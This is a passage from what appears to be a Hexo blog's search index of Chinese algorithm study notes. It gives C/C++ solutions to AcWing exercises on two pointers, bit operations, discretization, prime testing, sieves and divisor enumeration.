class="number">1</span>; i &lt;= n; i ++ ) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j ++ )  <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, b[i][j]);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">             </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="双指针算法"><a href="#双指针算法" class="headerlink" title="双指针算法"></a>双指针算法</h3><ul><li>将O(n**2)优化到O(n)</li></ul><p>for (int i = 0, j = 0; i &lt; n; i ++ )<br>{<br>    while (j &lt; i &amp;&amp; check(i, j)) j ++ ;</p><p>}</p><p>   for (int i = 1; i &lt;= n; i ++ )<br>            for (int j = 1; j &lt;= m; j ++ ) </p><p>​                    </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100010</span>;</span><br><span class="line"><span class="type">int</span> a[N], s[N];<span class="comment">//s[N]统计字母出现次数</span></span><br><span class="line"><span class="comment">//j指向不重复序列头，i指向不重复序列尾</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> n, r = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; a[i];</span><br><span class="line">        ++ s[a[i]];</span><br><span class="line">        <span class="keyword">while</span> (s[a[i]] &gt; <span class="number">1</span>) -- s[a[j++]];<span class="comment">//不能用if，因为当检测到两个相同字母时，要j++直到消除先添加的字母。</span></span><br><span class="line">        r = max(r, i - j + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; r;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h3><p>lowbit(x)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">lowbit</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> x &amp; -x;<span class="comment">//10010 &amp;(01101+1)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    <span class="keyword">while</span>(n --)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> x;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; x;</span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">while</span>(x)    x-= lowbit(x), res++;</span><br><span class="line"></span><br><span class="line">       <span class="built_in">cout</span> &lt;&lt; res &lt;&lt; <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="离散化"><a href="#离散化" class="headerlink" title="离散化"></a>离散化</h3><p>值域跨度大，但是很稀疏</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;  PII;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">300010</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> a[N], s[N];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; alls;</span><br><span class="line">vector&lt;PII&gt; add, query;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span>         <span class="comment">//二分查找</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="type">int</span> l = <span class="number">0</span>, r = alls.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(l &lt; r)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> mid = l + r &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(alls[mid] &gt;= x)  r = mid;</span><br><span class="line">        <span class="keyword">else</span> l = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> r + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i &lt; n; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> x, c;</span><br><span class="line">        cin &gt;&gt; x &gt;&gt; c;</span><br><span class="line">        add.<span class="built_in">push_back</span>(&#123;x,c&#125;);</span><br><span class="line">        alls.<span class="built_in">push_back</span>(x);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i &lt; m; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> l, r;</span><br><span class="line">        cin &gt;&gt; l &gt;&gt; r;</span><br><span class="line">        query.<span class="built_in">push_back</span>(&#123;l, r&#125;);        <span class="comment">//存储查找键值</span></span><br><span class="line">        alls.<span class="built_in">push_back</span>(l);</span><br><span class="line">        alls.<span class="built_in">push_back</span>(r);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//去重,值可以累加，但是坐标只有一个</span></span><br><span class="line">    <span class="built_in">sort</span>(alls.<span class="built_in">begin</span>(), alls.<span class="built_in">end</span>());</span><br><span class="line">    alls.<span class="built_in">erase</span>(<span class="built_in">unique</span>(alls.<span class="built_in">begin</span>() ,alls.<span class="built_in">end</span>()), alls.<span class="built_in">end</span>()) ;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> item : add)   <span class="comment">//迭代器遍历</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> x = <span class="built_in">find</span>(item.first);</span><br><span class="line">        a[x] += item.second;</span><br><span class="line">    &#125;   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span> ; i &lt;= alls.<span class="built_in">size</span>(); i ++)    s[i] = s[i - <span class="number">1</span>] + a[i]; <span class="comment">// 区间和</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> item : query)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> l = <span class="built_in">find</span>(item.first),   r = <span class="built_in">find</span>(item.second);</span><br><span class="line">        cout &lt;&lt; s[r] - s[l - <span class="number">1</span>] &lt;&lt; endl;</span><br><span class="line">    &#125;   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="区间合并"><a href="#区间合并" class="headerlink" title="区间合并"></a>区间合并</h3><ul><li>按区间左端点排序</li></ul>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数学知识</title>
      <link href="/2024/07/29/%E7%AE%97%E6%B3%95/%E6%95%B0%E5%AD%A6%E7%9F%A5%E8%AF%86/"/>
      <url>/2024/07/29/%E7%AE%97%E6%B3%95/%E6%95%B0%E5%AD%A6%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="数学知识"><a href="#数学知识" class="headerlink" title="数学知识"></a>数学知识</h1><h3 id="算数基本定理"><a href="#算数基本定理" class="headerlink" title="算数基本定理"></a>算数基本定理</h3><p>任何大于 1 的整数是<strong>质数</strong>或<strong>独一无二的质数乘积</strong>（不理次序）。</p><p>任何一个大于1的自然数n都可以表示为素数的乘积形式：</p><script type="math/tex; mode=display">[n = p_1^{e_1} \cdot p_2^{e_2} \cdot \ldots \cdot p_k^{e_k}]$$。其中，$$(p_1, p_2, \ldots, p_k) $$是素数，$$(e_1, e_2, \ldots, e_k) $$是大于等于1的整数，并且这种分解方式是唯一的。### 质数在大于1的整数中，如果只包含1和本身这两个约数，就被称为质数，或者叫素数。#### AcWing 866. 试除法判定质数![image-20240730144012928](https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240730144012928.png)质数的判定——试除法    O(sqrt(n))由于约数是成对出现的，所以n的最大约数只能是$$\sqrt{n}$$​<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">110</span>;</span><br><span class="line"><span class="type">int</span> a[N];</span><br><span class="line"></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">is_prime</span> <span class="params">(<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">2</span>)  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span>  (<span class="type">int</span> i  = <span class="number">2</span>; i &lt;= n/i; i ++)</span><br><span class="line">         &#123;</span><br><span class="line">        <span class="keyword">if</span> (n % i == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n ; i++)    <span class="built_in">cin</span> &gt;&gt; a[i]; </span><br><span class="line"></span><br><span class="line">     <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n ; i++)    </span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_prime (a[i]))</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Yes&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;No&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>#### 867. 分解质因数![image-20240730143925366](https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240730143925366.png)分解质因数    O(sqrt(n))- 质因数的**底数**指的是质数的基数，比如在分解12=2×2×3的式子中，2和3就是底数。 而**指数**指的是底数出现的次数,底数2的指数为2，底数3的指数为1。- 由算数基本定理，我们从小到大枚举所有质数，求出底数后再求质数，即可分解成功<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">110</span>;</span><br><span class="line"><span class="type">int</span> a[N];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">divide</span> <span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= x/i; i ++)</span><br><span class="line">        <span class="keyword">if</span> (x % i == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> s = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (x % i == <span class="number">0</span>)  </span><br><span class="line">            &#123;</span><br><span class="line">                x /= i;</span><br><span class="line">                s ++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; i &lt;&lt; <span class="string">&#x27; &#x27;</span> &lt;&lt; s &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (x &gt; <span class="number">1</span>)</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="string">&#x27; &#x27;</span> &lt;&lt; <span class="number">1</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">puts</span> (<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n ; i++)    <span class="built_in">cin</span> &gt;&gt; a[i]; </span><br><span class="line"></span><br><span class="line">     <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n ; i++)    </span><br><span class="line">        &#123;</span><br><span class="line">        divide (a[i]);  </span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>#### 868. 筛质数![image-20240730150412248](https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240730150412248.png)埃式筛法：质数定理:1~n中有n/lnn个质数。<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e6</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> primes[N], cnt;</span><br><span class="line"><span class="type">bool</span> st[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_primes</span><span class="params">(<span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!st[i])  <span class="comment">//若为质数</span></span><br><span class="line">        &#123;</span><br><span class="line">            primes[cnt++] = i;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> j = i + i; j &lt;=n; j+=i)</span><br><span class="line">                    st[j] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="built_in">get_primes</span>(n);</span><br><span class="line">    cout &lt;&lt; cnt &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>线性筛法：n只会被最小质因子筛掉(适合范围较大)<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e6</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> primes[N], cnt;</span><br><span class="line"><span class="type">bool</span> st[N];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_primes</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!st[i]) &#123; <span class="comment">// 若当前数字i是素数</span></span><br><span class="line">            primes[cnt++] = i; <span class="comment">// 将i存入primes数组</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; primes[j] &lt;= n / i; j++) &#123;</span><br><span class="line">                st[primes[j] * i] = <span class="literal">true</span>; <span class="comment">// 标记i的倍数为非素数</span></span><br><span class="line">                <span class="keyword">if</span> (i % primes[j] == <span class="number">0</span>) <span class="keyword">break</span>; <span class="comment">// 保证每个合数只被其最小的素因数筛掉</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  cin &gt;&gt; n;</span><br><span class="line">  <span class="built_in">get_primes</span>(n);</span><br><span class="line">  cout &lt;&lt; cnt &lt;&lt; endl;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>### 约数#### 869. 试除法求约数![image-20240730160310539](https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240730160310539.png)试除法求所有约束,时间复杂度$$\sqrt{n}</script><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; vec;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n / i; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (n % i == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        vec.<span class="built_in">push_back</span>(i);</span><br><span class="line">        <span class="keyword">if</span> (i != n / i)</span><br><span class="line">            vec.<span class="built_in">push_back</span>(n / i);</span><br><span class="line">      &#125;</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sort</span>(vec.<span class="built_in">begin</span>(),vec.<span class="built_in">end</span>());</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> i : vec)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; i &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  cin &gt;&gt; n;</span><br><span class="line">  <span class="keyword">while</span>(n --)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    cin &gt;&gt; x;</span><br><span class="line">    <span class="built_in">solve</span>(x);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="870-约数个数"><a href="#870-约数个数" class="headerlink" title="870. 约数个数"></a>870. 约数个数</h4><script type="math/tex; mode=display">[\text{约数个数} = (c_1 + 1) \cdot (c_2 + 1) \cdots (c_k + 1)]</script><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240730170202760.png" alt="image-20240730170202760"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> mod = <span 